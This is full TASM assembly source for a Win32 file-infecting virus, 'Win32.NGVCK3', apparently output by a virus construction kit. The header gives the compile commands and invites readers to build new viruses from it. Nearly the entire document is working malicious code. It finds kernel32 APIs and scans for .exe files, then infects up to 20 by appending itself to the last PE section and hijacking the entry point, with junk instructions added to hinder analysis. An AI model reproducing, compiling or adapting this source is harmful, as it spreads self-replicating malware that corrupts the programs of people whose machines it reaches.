              
;
;
; Win32.NGVCK3 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK3
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 20
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart
 sub eax, ecx                           ; Trash


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear eax
 mov eax, -52230d
 add eax, 52230d

 push eax
 push eax
 push 3h
 push eax
                                        ; add eax, 1
 sub eax, -1d
 push eax
 mov eax, 80000000h or 40000000h
 push eax
 lea ecx, [ebp+WFD_szFileName]

 push ecx
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop edx
 push edx
 push 0
 push edx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz CloseFile
 push edx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov esi, ebp
 add esi, offset WIN32_FIND_DATA

 push esi
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 push 276d
 pop eax
 mov edi, ebp
 add edi, offset WFD_szFileName


ClearOldData2:
 mov byte ptr [edi], 0h
 adc edx, 38040539d                     ; Trash
                                        ; add edi, 1
 inc edi
 dec eax
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov edi, offset WIN32_FIND_DATA
 add edi, ebp

 push edi
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret





;                  [ ///// * Data * \\\\\ ]

Data:
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 Attributes  dd 0h
 filemask    db '*.eXe',0
 KernelPE    dd 0h
 TempApisearch2 dd 0h
 MapHandle   dd 0h
 OldBase     dd 400000h
 NewSize     dd 0h
 NTableVA    dd 0h
 AlignReg2   dd 0h
 KernelMZ    dd 0h
 TempApisearch1 dd 0h
 FindHandle  dd 0h
 InfCounter  dd 0h
 OTableVA    dd 0h
 TempAPI     dd 0h
 AlignReg1   dd 0h
 FileHandle  dd 0h
 NewEIP      dd 0h

 APIOffsets:
 XGetFileAttributesA    dd 0h
 XCreateFileMappingA    dd 0h
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XMapViewOfFile         dd 0h
 XSetFileAttributesA    dd 0h
 XFindClose             dd 0h
 XCloseHandle           dd 0h
 XFindNextFileA         dd 0h
 XUnmapViewOfFile       dd 0h

 Trash1      dd 0h
 ATableVA    dd 0h
 TempApisearch3 dd 0h
 OldEIP      dd 0h
 db 'Virus : Win32.NGVCK3 Author : SnakeByte',0
 MapAddress  dd 0h

 APINames:
 db 18d, 'GetFileAttributesA'
 db 18d, 'CreateFileMappingA'
 db 11d, 'CreateFileA'
 db 14d, 'FindFirstFileA'
 db 13d, 'MapViewOfFile'
 db 18d, 'SetFileAttributesA'
 db 09d, 'FindClose'
 db 11d, 'CloseHandle'
 db 13d, 'FindNextFileA'
 db 15d, 'UnmapViewOfFile'

 counter     dw 0h




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel by using hardcoded values
 mov esi, 0bff70000h
 call GetKernel32
 jnc GetApis
 mov esi, 077f00000h
 call GetKernel32
 jnc GetApis
 mov esi, 077e00000h
 call GetKernel32
 jnc GetApis

 and ebx, 78044084d                     ; Trash
 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear ecx
 mov ecx, 0

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[ecx]
 mov edx, ebp
 add edx, offset GetKernel32Exception

 push edx
 push eax

                                        ; add esi, 1
 inc esi
GetKernelLoop:
                                        ; clear ecx
 sub ecx, ecx
 dec esi
 mov cx, word ptr [esi+03ch]
 test cx,0f800h
 jnz GetKernelLoop
 cmp esi, dword ptr [esi+ecx+34h]
 jnz GetKernelLoop
 push esi
 pop dword ptr [ebp+KernelMZ]
 mov ebx, esi
 add ebx, [esi+3Ch]
 mov [KernelPE+ebp], ebx

                                        ; clear esi
 mov esi, 0

 pop dword ptr fs:[esi]
 pop ecx
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear edx
 mov edx, -16132d
 add edx, 16132d

 mov eax, dword ptr fs:[edx]
 mov esp, dword ptr [eax]
GetKernel32NotFound:
                                        ; clear edi
 xor edi, edi

 pop dword ptr fs:[edi]
 pop ecx
 popad
 stc
ret


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
                                        ; clear ecx
 mov ecx, -66533d
 add ecx, 66533d
 xor ecx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ecx, 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 lea ecx, [ebp+WFD_szFileName]
 xchg edx, ecx

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov eax, 128
 mov eax, ( 128d - 35d )
 add eax, 35d
 push eax
 mov ecx, offset WFD_szFileName
 add ecx, ebp


 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 test eax, eax
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [eax+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [eax+3Ch]
 pop edx
                                        ; check if header lies inside the file
 cmp edx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edx, eax
                                        ; check for PE Header
                                        ; check for EP
 movzx ecx, word ptr [edx]
 xor ecx, 'EP'
 jz Goodfile2
                                        ; mov ecx, 36669
 mov ecx, 0
 add ecx, 36669d
 cmp ecx, 36669d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov ecx, dword ptr [ebp+Attributes]
 push ecx
 mov ecx, ebp
 add ecx, offset WFD_szFileName

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * Execute Original File * \\\\\ ]

 adc dword ptr [ebp+Trash1], 868240     ; Trash
NoKernel:
                                        ; store old EIP and ImageBase
 mov esi, dword ptr [ebp+OldEIP]

 push esi
 pop dword ptr [ebp+retEIP]

 push dword ptr [ebp+OldBase]
 pop esi

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], esi


 rcl eax, 1d                            ; Trash

ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 jmp edx



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; store old EIP and ImageBase
                                        ; mov esi, -1
 mov esi, ( -1d xor 5d )
 xor esi, 5d
 and esi, dword ptr [ebp+OldEIP]

 push esi
 pop dword ptr [ebp+retEIP]

                                        ; mov ebx, -1
 mov ebx, ( -1d + 26d )
 sub ebx, 26d
 and ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], ebx



                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx

                                        ; load API Names and Offsets
 mov esi, offset APINames
 add esi, ebp

 lea edx, [ebp+APIOffsets]


GetApisLoop: 

                                        ; clear eax
 mov eax, -1146d
 add eax, 1146d
 loadsb
                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; esi points to the Name
                                        ; edx points to the offset

 call SearchAPI1
 push esi
 add dword ptr [esp], eax
 pop esi
 mov ecx, dword ptr [ebp+TempAPI]
 mov dword ptr [edx], -1
 and dword ptr [edx], ecx
                                        ; add edx, 4
 add edx, 4d
 dec ebx
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; esi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad


                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; clear ecx
 mov ecx, 34761d
 sub ecx, 34761d
 add ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edi
 mov edi, 5703d
 sub edi, 5703d
 add edi, [ecx+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 inc edi
 add edi, 27d
                                        ; get ATableVA
 mov ecx, dword ptr [edi]
                                        ; add edi, 4
 add edi, 4d
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ecx
                                        ; get NTableVA
 mov ecx, dword ptr [edi]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ecx
                                        ; add edi, 4
 inc edi
 ror ebx, 7d                            ; Trash
 add edi, 3d
                                        ; get OTableVA
 mov ecx, dword ptr [edi]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
                                        ; clear ecx
 mov ecx, -26584d
 add ecx, 26584d
 xor ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ecx
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [ecx]
                                        ; mov ecx, edx
                                        ; clear ecx
 mov ecx, 7272d
 sub ecx, 7272d
 add ecx, edx
                                        ; mov edi, edx
 push edx
 pop edi
 mov dword ptr [ebp+TempApisearch1], 0
 xor dword ptr [ebp+TempApisearch1], eax
 mov dword ptr [ebp+TempApisearch2], edi
 mov dword ptr [ebp+TempApisearch3], -1
 and dword ptr [ebp+TempApisearch3], esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov dl, byte ptr [esi]
 cmp dl, byte ptr [edi]
 jne ApiNotFound
 sub eax, 1
 or eax, eax
 jz FoundApi1
                                        ; add edi, 1
 inc edi
                                        ; add esi, 1
 inc esi
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ecx
                                        ; mov edi, -1
 mov edi, ( -1d - 23d )
 add edi, 23d
 and edi, dword ptr [ebp+TempApisearch2]
                                        ; mov esi, -1
 mov esi, -1d
 and esi, dword ptr [ebp+TempApisearch3]
 mov eax, dword ptr [ebp+TempApisearch1]
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop esi
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 mov edx, ebx
                                        ; clear ebx
 sub ebx, ebx
 mov bx, word ptr [edx]
 clc
 rcl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [ebx]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edx, ecx
 add edx, [ecx+3Ch]
                                        ; get File Alignment
                                        ; add edx, 60
 inc edx
 add edx, 59d
 mov eax, [edx]
 shl ebx, 8d                            ; Trash
 sub edx, 60d
                                        ; clear ecx
 mov ecx, 65852d
 sub ecx, 65852d
 add ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ecx, VirusSize
 shl edx, 6d                            ; Trash
 mov dword ptr [ebp+AlignReg2], eax
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ecx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], ecx
 shr ebx, 25d                           ; Trash
 call CreateMap
 jc NoEXE
                                        ; clear esi
 and esi, 0
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edi, dword ptr [esi+3Ch]
 add edi, esi
                                        ; infect by increasing the last section
                                        ; clear esi
 push 0
 pop esi
 add esi, edi
                                        ; get last section
 movzx ecx, word ptr [esi+06h]
 dec ecx
 imul ecx, ecx, 28h
 add edi, ecx
                                        ; add edi, 120
 add edi, 120d
 mov ebx, dword ptr [esi+74h]
 clc
 rcl ebx, 3
 add edi, ebx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], edx
                                        ; clear ebx
 and ebx, 0

 add ebx, [edi+10h]
                                        ; mov edx, ebx
 mov edx, ebx
 add edi, 14h
 add ebx, [edi]
 sub edi, 14h
 push ebx
 mov eax, edx
 add edi, 0Ch
 add eax, [edi]
 sub edi, 0Ch
 mov dword ptr [ebp+NewEIP], 0
 xor dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], eax
 mov eax, [edi+10h]
 push eax
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add eax, VirusSize
 pop dword ptr [ebp+AlignReg2]
 push eax
 pop dword ptr [ebp+AlignReg1]
 call Align
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [edi+10h], 0h
 add dword ptr [edi+10h], eax
 pop eax
 add eax, VirusSize
 mov dword ptr [edi+08h], eax
 mov eax, dword ptr [edi+10h]
 add eax, dword ptr [edi+0Ch]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [edi+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ebx, VirusSize
 lea edx, [ebp+Virus]
 xchg edx, esi


AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 and ecx, eax                           ; Trash
 pop edx
 add edx, -1
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], edx
 clc
ret
 inc ebx                                ; Trash

NoEXE:
 stc
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 mov edx, 0
 mov ecx, dword ptr [ebp+AlignReg2]
 div ecx
                                        ; add eax, 1
 sub eax, -1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 push 20d
 pop dword ptr [ebp+InfCounter]
 lea eax, [ebp+filemask]
 xchg eax, edi

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
 add eax, -1
 add eax, 1
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or ecx, ecx                            ; Trash
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
 sbb ebx, 3d                            ; Trash
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ebx
 sub ebx, ebx
 push ebx
 call ExitProcess



end FakeCode

